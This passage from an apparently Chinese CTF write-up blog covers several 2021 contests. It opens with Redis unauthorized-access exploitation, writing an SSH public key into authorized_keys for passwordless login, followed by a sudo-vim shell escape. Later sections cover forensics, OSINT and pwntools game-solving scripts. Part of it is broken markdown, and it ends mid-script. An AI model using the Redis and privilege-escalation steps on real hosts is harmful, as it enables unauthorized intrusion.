<p>然后用<code>info server</code>测试一下连接，成功登录。</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210911123056602.png" alt></p>
<p>然后深层利用，使用ssh登录密钥进行免密码登录主机，这里要先使用<code>ssh-keygen -t rsa</code>来生成一个密钥，这里我已经生成过了。然后复制出来我的id_rsa.pub公钥文件。</p>
<pre class="line-numbers language-none"><code class="language-none">config get *<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>得到redis的目录为<code>/var/lib/redis</code></p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210911130455509.png" alt></p>
<pre class="line-numbers language-none"><code class="language-none">192.168.10.144:6379&gt; config set dir &#x2F;var&#x2F;lib&#x2F;redis&#x2F;.ssh
OK
192.168.10.144:6379&gt; config set dbfilename authorized_keys
OK
192.168.10.144:6379&gt; save
OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后再在redis-cli上执行下面的内容，其中<code>ssh-rsa key_pub</code>内容就是上面keygen生成的pub公钥文件的内容</p>
<pre class="line-numbers language-none"><code class="language-none">set xxxx &quot;\n\n\nssh-rsa key_pub\n\n\n&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>最后再save一下就行了。在攻击机(也就是刚才生成密钥的机器上面)执行下面的命令以连接到受害者主机，密码就是生成key时所用的密码，我这里没设置密码就直接登进去了。</p>
<pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa redis@192.168.10.144<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后发现hype用户，使用<code>sudo -u hype /usr/bin/vim /home/hype/backup.sh</code>进入hype用户权限，再输入<code>:!/bin/ash</code></p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210911133705682.png" alt></p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210911134024212.png" alt></p>
<p>下面的mission环节对我来说就没那么有意思了，这里就不再复现了。</p>
<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="Hiding-in-plain-sight"><a href="#Hiding-in-plain-sight" class="headerlink" title="Hiding in plain sight"></a>Hiding in plain sight</h3><pre class="line-numbers language-none"><code class="language-none">I think there is something fishy about this image.

Can you help me out?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>winhex打开，flag在最后。</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210810230649250.png" alt></p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;h1dd3n_t3xt_1n_pl41ns1ght&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="Welcome-to-the-challenge"><a href="#Welcome-to-the-challenge" class="headerlink" title="Welcome to the challenge"></a>Welcome to the challenge</h3><pre class="line-numbers language-none"><code class="language-none">Welcome to the RCTS Challenge!

Can you find the flag?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>010editor打开发现最后一点有张png，直接foremost分开就行了</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210810231639536.png" alt></p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;0n3_1m4g3_1s_n0t_3n0ugh&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="About-us"><a href="#About-us" class="headerlink" title="About us"></a>About us</h3><pre class="line-numbers language-none"><code class="language-none">This challenge is about the RCTS CERT at FCCN.

Can you get the flag?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">$ strings RCTSCERT-FCCN.pdf | grep flag
  &lt;pdfx:Flag&gt;flag&#123;4b0ut_us_4t_rcts_c3rt&#125;&lt;&#x2F;pdfx:Flag&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;4b0ut_us_4t_rcts_c3rt&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="Keyp-it-universal"><a href="#Keyp-it-universal" class="headerlink" title="Keyp it universal"></a>Keyp it universal</h3><pre class="line-numbers language-none"><code class="language-none">#forensics #pcap
We intercepted a strange communication which we believe has important information inside.

Can you retrieve the information from it?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>pacp流量分析、usb流量分析，但是tshark失效了，看起来流量包也没有多长，就直接口算了</p>
<pre class="line-numbers language-none"><code class="language-none">09 0f 04 0a 202f 18 16 05 202d 13 21 06 0e 20 17 202d 06 21 13 17 18 15 20 202d 1e 16 202d 09 18 11 2030<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后又有usb流量对应的字典，直接搞个脚本</p>
<pre class="line-numbers language-none"><code class="language-none">normalKeys &#x3D; &#123;&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;&#x3D;&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#39;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;&#x2F;&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;

shiftKeys &#x3D; &#123;&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;

flag &#x3D; &#39;&#39;
a &#x3D; &#39;09 0f 04 0a 202f 18 16 05 202d 13 21 06 0e 20 17 202d 06 21 13 17 18 15 20 202d 1e 16 202d 09 18 11 2030&#39;.split()
for i in a:
    if len(i) &#x3D;&#x3D; 2:
        flag +&#x3D; normalKeys[i]
    else:
        flag +&#x3D; shiftKeys[i[2:]]
print(flag)
# flag&#123;usb_p4ck3t_c4ptur3_1s_fun&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Maybe-the-helper-can-help"><a href="#Maybe-the-helper-can-help" class="headerlink" title="Maybe the helper can help"></a>Maybe the helper can help</h3><p><strong>steghide爆破</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/RickdeJager/stegseek">GitHub地址</a></p>
<p>使用stegseek爆破直接得</p>
<pre class="line-numbers language-none"><code class="language-none">└─$ stegseek the-jetsons-family.jpg
StegSeek 0.6 - https:&#x2F;&#x2F;github.com&#x2F;RickdeJager&#x2F;StegSeek

[i] Found passphrase: &quot;rosey&quot;
[i] Original filename: &quot;steganopayload986089.txt&quot;.
[i] Extracting to &quot;the-jetsons-family.jpg.out&quot;.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210911233138888.png" alt></p>
<p>两次base64解密之后得到flag</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;ThEfUtUrEiSnOw!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>stegseek是steghide隐写的爆破工具，使用的是专门的密码库，反正一般的密码解起来还是挺快的。</p>
<h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="Welcome-to-Lisbon"><a href="#Welcome-to-Lisbon" class="headerlink" title="Welcome to Lisbon!"></a>Welcome to Lisbon!</h3><pre class="line-numbers language-none"><code class="language-none">Oh, some activists defaced a Victoria Secret&#39;s store.

Find out which was the model whose photo was damaged.

Flag format: flag&#123;firstname_surname&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>社工题</p>
<p>直接上谷歌搜<code>Victoria Secret&#39;s store lisbon</code>，跳出来的第一个就是这个商店，然后进入详情找到比较清晰的一张</p>
<p><a target="_blank" rel="noopener" href="https://foursquare.com/v/victorias-secret/51f6abee498ecfea45748da0/photos">Victoria Secret’s store</a></p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210810235703483.png" alt></p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210810235510323.png" alt></p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210811001253648.png" alt></p>
<p><del>但是这国外的模特咱也不认识啊，这题就搁置了。</del></p>
<p>oh，原来她叫<code>Adriana lima</code></p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;adriana_lima&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><h3 id="Knock-Knock"><a href="#Knock-Knock" class="headerlink" title="Knock Knock"></a>Knock Knock</h3><pre class="line-numbers language-none"><code class="language-none">&#96;&#96;&#96;





# InCTF

## misc

### Sanity Check

签到
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>inctf{welcome_t0_inctf_internationals_2021}<br><pre class="line-numbers language-none"><code class="language-none">


### Alpha Pie
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>We have created a mini game to test your skills. Go grab the flag!!<br><pre class="line-numbers language-none"><code class="language-none">


&#96;nc misc.challenge.bi0s.in 1337&#96;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>Welcome to Alpha pie game!!!<br>Rules:</p>
<ol>
<li>To complete one level you have match the left matrix to the right one by moiving each letter to their position in the right matrix</li>
<li>Moving to only adjecent column or row is possible.</li>
<li>Diagonal movements are not possible</li>
<li>negative numbers are not allowed in the input</li>
<li>The input format should be ‘current-x-cord,current-y-cord,to-x-cord,to-y-cord’.<br>eg : 0,0,0,1 (Will move letter at position 0,0 to position 0,1 if a letters is present at 0,0 and no letter is present at 0,1).</li>
<li>Number of moves will be limited for each level.</li>
<li>The game has a time limit of ‘n’ minutes.</li>
<li>You will lose the game if you enter certain number of invalid moves</li>
<li>After you pass 9 levels you will ge the flag.<br>Good luck ! Enjoy the game 👍</li>
</ol>
<p>Press ‘y’ to start:<br><pre class="line-numbers language-none"><code class="language-none">
简单写个脚本，一会儿就出来了，成功率还是很高的，这种不成功再执行一次，一次一次总会成功的。

![](2021年各比赛wp&#x2F;image-20210814022515512.png)

&#96;&#96;&#96;python
from pwn import *

chall &#x3D; remote(&#39;misc.challenge.bi0s.in&#39;, 1337)
chall.sendlineafter(b&quot;Press &#39;y&#39; to start:&quot;, b&#39;y&#39;)


def GetLevel():
    lev &#x3D; 1
    while True:
        data &#x3D; chall.recvline()
        if b&#39;Level-&#39; in data:
            lev &#x3D; data[7]
            print(data)
            print(chr(lev))
            try:
                lev &#x3D; int(chr(lev))
            except:
                lev &#x3D; int(chr(data[6]))
            print(&#39;Level &#x3D;&#39;, lev)
        if b&#39;-------&#39; in data:
            return lev


def step1(level):

    base, target &#x3D; [&quot;&quot;], [&quot;&quot;]
    for i in range(level):
        base.append(&quot;&quot;)
        target.append(&quot;&quot;)

    x &#x3D; 0
    while True:
        payload &#x3D; &quot;&quot;
        data &#x3D; chall.recvline()
        if b&#39;|&#39; in data:
            print(data)
            for y in range(level + 1):
                base[x] +&#x3D; chr(data[y * 4 + 2])
            tmp &#x3D; level * 5 + 8
            for y in range(level + 1):
                target[x] +&#x3D; chr(data[tmp + 4 * y])
            x +&#x3D; 1
        else:
            if base[0] &#x3D;&#x3D; &#39;&#39;:
                continue
            temp &#x3D; &#39;&#39;
            for i in range(len(base)):
                tmp &#x3D; base[i]
                for j in range(len(tmp)):
                    if tmp[j] !&#x3D; &#39;0&#39; and target[i][j] !&#x3D; tmp[j]:
                        payload &#x3D; str(i) + &#39;,&#39; + str(j) + &#39;,&#39;
                        temp &#x3D; tmp[j]

            for a in range(len(target)):
                tmp &#x3D; target[a]
                for b in range(len(tmp)):
                    if tmp[b] &#x3D;&#x3D; temp:
                        payload +&#x3D; str(a) + &#39;,&#39; + str(b)
            if payload[0] !&#x3D; payload[4] and base[int(payload[4])][int(payload[2])] &#x3D;&#x3D; &#39;0&#39;:
                payload &#x3D; payload[:-1] + payload[2]
            elif payload[0] !&#x3D; payload[4] and base[int(payload[0])][int(payload[6])] &#x3D;&#x3D; &#39;0&#39;:
                payload &#x3D; payload[:4] + payload[0] + payload[5:]

            if base[int(payload[4])][int(payload[6])] !&#x3D; &#39;0&#39; or (base[int(payload[4])][int(payload[2])] !&#x3D; &#39;0&#39; and base[int(payload[0])][int(payload[6])] !&#x3D; &#39;0&#39;) or payload[:3] &#x3D;&#x3D; payload[4:]:
                payload &#x3D; payload[4:] + &#39;,&#39; + payload[4] + &#39;,&#39; + payload[base[int(payload[4])].index(&#39;0&#39;)]
            break
    data &#x3D; chall.recvline()
    print(payload)
    chall.sendlineafter(b&quot;to-y-cord &#39; :&quot;, payload.encode())


if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    while True:
        data &#x3D; chall.recvline()
        if b&#39;-------&#39; in data:
            break
    for Level in range(9):

        while True:
            step1(Level + 1)
            data &#x3D; chall.recvline()
            if b&quot;Congrats&quot; in data:
                break
    while True:
        data &#x3D; chall.recvline()
        print(data)
        if b&#39;ctf&#39; in data:
            break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="find-plut0"><a href="#find-plut0" class="headerlink" title="find_plut0"></a>find_plut0</h3><pre class="line-numbers language-none"><code class="language-none">Find pluto , and get your Reward !!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1 id="吃瓜杯"><a href="#吃瓜杯" class="headerlink" title="吃瓜杯"></a>吃瓜杯</h1><h2 id="前言-5"><a href="#前言-5" class="headerlink" title="前言"></a>前言</h2><p>CTFSHOW举办的一次比赛，题目比较多。</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Misc游戏签到"><a href="#Misc游戏签到" class="headerlink" title="Misc游戏签到"></a>Misc游戏签到</h3><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210815024335170.png" alt></p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210815024149115.png" alt="image-20210815024149115"></p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210815025427006.png" alt="image-20210815025427006"></p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210815021239362.png" alt></p>
<pre class="line-numbers language-none"><code class="language-none">ctfshow&#123;White_give_game_only_waste_your_timehahaha&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> time
<span class="token keyword">import</span> random

<span class="token keyword">def</span> <span class="token function">GetMes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ans <span class="token operator">=</span> <span class="token string">''</span>
    ret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    tmp1 <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> chall<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token string">b'&#125;'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> tmp1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
                ret<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            tmp1 <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tmp1 <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">if</span> tmp1 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>
            ans <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ret<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span>
            ans <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ret<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token builtin">max</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
            <span class="token keyword">return</span> ans


<span class="token keyword">def</span> <span class="token function">step1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ch <span class="token operator">=</span> <span class="token string">''</span>
    order <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            order <span class="token operator">=</span> GetMes<span class="token punctuation">(</span><span class="token punctuation">)</span>
            chall<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'------------------------------\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            GetMes<span class="token punctuation">(</span><span class="token punctuation">)</span>
            chall<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'------------------------------\n'</span><span class="token punctuation">,</span> order<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> chall<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">b'flag'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
            ch <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">b'2'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
            <span class="token keyword">break</span>
    <span class="token keyword">return</span> ch


<span class="token keyword">def</span> <span class="token function">step2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ch <span class="token operator">=</span> step1<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> ch <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>
        chall<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        chall<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">,</span> ch<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        data <span class="token operator">=</span> chall<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        data <span class="token operator">=</span> chall<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">b'&#125;'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">10000000</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        chall <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwn.challenge.ctf.show'</span><span class="token punctuation">,</span> <span class="token number">28148</span><span class="token punctuation">)</span>
        chall<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'0.Magic option\n'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
